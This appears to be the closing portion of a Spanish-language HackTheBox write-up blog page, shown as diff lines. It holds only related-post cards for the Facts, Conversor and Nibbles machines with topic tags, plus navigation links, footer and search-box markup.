+    <h2 class="mt-8 text-2xl font-extrabold mb-10">Relacionados</h2>
+    <section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3">
+      
+        
+
+
+
+
+
+
+
+  
+
+  
+  
+    
+    
+      
+    
+      
+    
+      
+    
+  
+
+  
+  
+
+  
+  
+    
+      
+      
+        
+      
+    
+  
+
+
+
+<article
+  class="article-link--related relative min-h-full min-w-full overflow-hidden rounded-lg border border-neutral-300 dark:border-neutral-600">
+  
+    <div class="flex-none relative overflow-hidden thumbnail_card_related">
+      <img
+        src="/writeups/facts/featured_hu_531e0f79e94eba25.png"
+        role="presentation"
+        loading="lazy"
+        decoding="async"
+        fetchpriority="low"
+        class="not-prose absolute inset-0 w-full h-full object-cover">
+    </div>
+  
+  
+  <div class="p-4">
+    <header>
+      <a
+        
+          href="/writeups/facts/"
+        
+        class="not-prose before:absolute before:inset-0 decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 hover:underline hover:underline-offset-2">
+        <h2>
+          HackTheBox - Facts
+          
+        </h2>
+      </a>
+    </header>
+    <div class="text-sm text-neutral-500 dark:text-neutral-400">
+      
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2026-02-12T00:00:00&#43;00:00">12 de febrero de 2026</time><span class="px-2 text-primary-500">&middot;</span><span title="Tiempo de lectura">9 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+
+  
+  
+
+
+
+    </div>
+    
+      <div class="article-link__summary prose dark:prose-invert mt-1 line-clamp-5">
+        OS: Linux | Dificultad: Easy | Conceptos: MinIO, S3, CamaleonCMS, CVE Público, Binario Custom
+      </div>
+    
+  </div>
+  <div class="px-6 pt-4 pb-2"></div>
+</article>
+
+      
+        
+
+
+
+
+
+
+
+  
+
+  
+  
+    
+    
+      
+    
+      
+    
+      
+    
+  
+
+  
+  
+
+  
+  
+    
+      
+      
+        
+      
+    
+  
+
+
+
+<article
+  class="article-link--related relative min-h-full min-w-full overflow-hidden rounded-lg border border-neutral-300 dark:border-neutral-600">
+  
+    <div class="flex-none relative overflow-hidden thumbnail_card_related">
+      <img
+        src="/writeups/conversor/featured_hu_7d70bd0c9074860b.png"
+        role="presentation"
+        loading="lazy"
+        decoding="async"
+        fetchpriority="low"
+        class="not-prose absolute inset-0 w-full h-full object-cover">
+    </div>
+  
+  
+  <div class="p-4">
+    <header>
+      <a
+        
+          href="/writeups/conversor/"
+        
+        class="not-prose before:absolute before:inset-0 decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 hover:underline hover:underline-offset-2">
+        <h2>
+          HackTheBox - Conversor
+          
+        </h2>
+      </a>
+    </header>
+    <div class="text-sm text-neutral-500 dark:text-neutral-400">
+      
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2026-02-16T00:00:00&#43;00:00">16 de febrero de 2026</time><span class="px-2 text-primary-500">&middot;</span><span title="Tiempo de lectura">7 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+
+  
+  
+
+
+
+    </div>
+    
+      <div class="article-link__summary prose dark:prose-invert mt-1 line-clamp-5">
+        OS: Linux | Dificultad: Easy | Conceptos: XSLT Injection, CVE Público, Binario needrestart
+      </div>
+    
+  </div>
+  <div class="px-6 pt-4 pb-2"></div>
+</article>
+
+      
+        
+
+
+
+
+
+
+
+  
+
+  
+  
+    
+    
+      
+    
+      
+    
+      
+    
+  
+
+  
+  
+
+  
+  
+    
+      
+      
+        
+      
+    
+  
+
+
+
+<article
+  class="article-link--related relative min-h-full min-w-full overflow-hidden rounded-lg border border-neutral-300 dark:border-neutral-600">
+  
+    <div class="flex-none relative overflow-hidden thumbnail_card_related">
+      <img
+        src="/writeups/nibbles/featured_hu_a1ae6988a2594ffd.png"
+        role="presentation"
+        loading="lazy"
+        decoding="async"
+        fetchpriority="low"
+        class="not-prose absolute inset-0 w-full h-full object-cover">
+    </div>
+  
+  
+  <div class="p-4">
+    <header>
+      <a
+        
+          href="/writeups/nibbles/"
+        
+        class="not-prose before:absolute before:inset-0 decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 hover:underline hover:underline-offset-2">
+        <h2>
+          HackTheBox - Nibbles
+          
+        </h2>
+      </a>
+    </header>
+    <div class="text-sm text-neutral-500 dark:text-neutral-400">
+      
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2026-02-14T00:00:00&#43;00:00">14 de febrero de 2026</time><span class="px-2 text-primary-500">&middot;</span><span title="Tiempo de lectura">6 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+
+  
+  
+
+
+
+    </div>
+    
+      <div class="article-link__summary prose dark:prose-invert mt-1 line-clamp-5">
+        OS: Linux | Dificultad: Easy | Conceptos: Nibbleblog, CVE Público, Metasploit
+      </div>
+    
+  </div>
+  <div class="px-6 pt-4 pb-2"></div>
+</article>
+
+      
+    </section>
+  
+
+
+      </div>
+    </section>
+
+    
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
+      <div class="flex justify-between pt-3">
+        <span class="flex flex-col">
+          
+            <a
+              class="flex text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+              href="/writeups/nibbles/">
+              <span class="leading-6">
+                <span class="inline-block rtl:rotate-180">&larr;</span>&ensp;HackTheBox - Nibbles
+              </span>
+            </a>
+            
+              <span class="ms-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400">
+                <time datetime="2026-02-14T00:00:00&#43;00:00">14 de febrero de 2026</time>
+              </span>
+            
+          
+        </span>
+        <span class="flex flex-col items-end">
+          
+            <a
+              class="flex text-right text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+              href="/writeups/conversor/">
+              <span class="leading-6">
+                HackTheBox - Conversor&ensp;<span class="inline-block rtl:rotate-180">&rarr;</span>
+              </span>
+            </a>
+            
+              <span class="me-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400">
+                <time datetime="2026-02-16T00:00:00&#43;00:00">16 de febrero de 2026</time>
+              </span>
+            
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        
+
+
+  
+
+
+
+
+
+
+<div
+  id="scroll-to-top"
+  class="fixed bottom-6 end-6 z-50 transform translate-y-4 opacity-0 duration-200">
+  <a
+    href="#the-top"
+    class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Ir arriba"
+    title="Ir arriba">
+    &uarr;
+  </a>
+</div>
+
+      </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+  
+  <div class="flex items-center justify-between">
+    
+    
+      <p class="text-sm text-neutral-500 dark:text-neutral-400">
+          &copy;
+          2026
+          Nicolás Seral
+      </p>
+    
+
+    
+    
+      <p class="text-xs text-neutral-500 dark:text-neutral-400">
+        
+        
+        Desarrollada con <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+      </p>
+    
+  </div>
+  
+    <script>
+      mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+        margin: 24,
+        background: "rgba(0,0,0,0.5)",
+        scrollOffset: 0,
+      });
+    </script>
+  
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
+  data-url="http://localhost:1313/">
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Buscar"
+          tabindex="0">
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Cerrar (Esc)">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+  
+</html>
